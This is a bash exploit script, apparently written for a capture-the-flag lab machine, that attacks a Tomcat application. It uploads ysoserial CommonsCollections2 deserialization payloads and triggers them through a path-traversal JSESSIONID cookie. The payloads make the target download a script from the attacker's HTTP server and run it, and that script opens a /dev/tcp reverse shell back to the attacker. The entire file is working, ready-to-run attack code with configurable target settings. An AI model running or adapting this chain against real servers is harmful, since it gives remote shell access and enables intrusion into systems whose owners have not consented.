#!/bin/bash

# Use your favourite listener for the callback
# Requirements: 
# - jdk version 11
# - ysoserial-master.jar (https://github.com/frohoff/ysoserial)

attacker_ip="10.8.33.59"
attacker_port="443"

victim_ip="admin.certain-doom.thm"   #can also be a domain
victim_port="8080"

request_proto="http" # !CHANGE THE PROTOCOL IF https !


echo "[*] Start pwncat listener on port $attacker_port"
echo ""


echo "[*] Creating payload"
echo ""
echo "#\!/bin/bash\n/bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1" > payload.sh
echo ""
python3 -m http.server 80 & echo $! > server.pid

echo "[*] Generating and uploading payload and uploading it to the target machine"
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ysoserial-master.jar   CommonsCollections2 "curl http://$attacker_ip/payload.sh -o /tmp/t.sh" > downloadPayload.session
curl -s -X POST $request_proto://$victim_ip:$victim_port/reports/upload -H "Content-Type: multipart/form-data" -F "uploadFile=@downloadPayload.session">/dev/null
curl -s $request_proto://$victim_ip:$victim_port/reports/ -H 'Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/downloadPayload'>/dev/null
echo ""

#echo "[*] Making payload executable"
#PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ysoserial-master.jar   CommonsCollections2 'chmod +x /tmp/t.sh' > chmodPayload.session
#curl -X POST $request_proto://$victim_ip:$victim_port/reports/upload -H "Content-Type: multipart/form-data" -F "uploadFile=@chmodPayload.session" >/dev/null
#curl $request_proto://$victim_ip:$victim_port/reports/ -H 'Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/chmodPayload' >/dev/null

echo "[*] Executing payload"
PATH=/usr/lib/jvm/java-11-openjdk-amd64/bin:$PATH java -jar ysoserial-master.jar   CommonsCollections2 'bash /tmp/t.sh' > executePayload1.session
curl -s -X POST $request_proto://$victim_ip:$victim_port/reports/upload -H "Content-Type: multipart/form-data" -F "uploadFile=@executePayload1.session">/dev/null
curl -s $request_proto://$victim_ip:$victim_port/reports/ -H 'Cookie: JSESSIONID=../../../../../../../../usr/local/tomcat/temp/uploads/executePayload1'>/dev/null
echo ""
echo "[*] Done!\t Cleaning up"
kill -9 $(cat server.pid)
